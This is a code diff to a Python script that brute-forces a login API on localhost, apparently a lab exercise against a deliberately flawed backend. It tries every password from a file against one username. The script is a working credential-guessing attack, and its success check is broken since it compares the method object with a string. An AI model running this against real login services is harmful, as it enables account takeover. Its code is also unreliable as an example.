@@ -8,6 +8,7 @@ import threading
 import sys
 import os
 import json
+from urllib.error import HTTPError
 
 
 url = 'http://localhost:8080/securitybackendflaws/api/user/login'
@@ -22,27 +23,25 @@ def build_password(password_file):
     return passwords
 
 
-def bruteForce(passwords):
+passwords = build_password('passwords.txt')
 
-    for passw in passwords:
-        body = {"username": "AndersAnd", "password": "{}".format(passw)}
+for passw in passwords:
+    try:
+        body = {"userName": "AndersAnd", "password": "{}".format(passw)}
 
-        request = urllib.request.Request(url)
-        request.add_header('Content-Type', 'application/json')
+        request = urllib.request.Request(url, method='POST')
         jsondata = json.dumps(body)
-
         jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
-
-        request.add_header('Content-Length', len(jsondataasbytes))
-
-        print(jsondataasbytes)
-
-        request = urllib.request.Request(url)
         request.add_header('Content-Type', 'application/json')
-        response = urllib.request.urlopen(request, jsondataasbytes)
+        request.add_header('Content-Length', len(jsondataasbytes))
+        print(jsondataasbytes)
+        with urllib.request.urlopen(request, jsondataasbytes) as response:
 
-        print(response.read())
+            print(response.getcode())
 
+            if response.getcode == '200':
+                print('Password is {}'.format(passw))
+            break
 
-file = build_password('passwords.txt')
-bruteForce(file)
+    except urllib.error.HTTPError as err:
+        print(err.code)
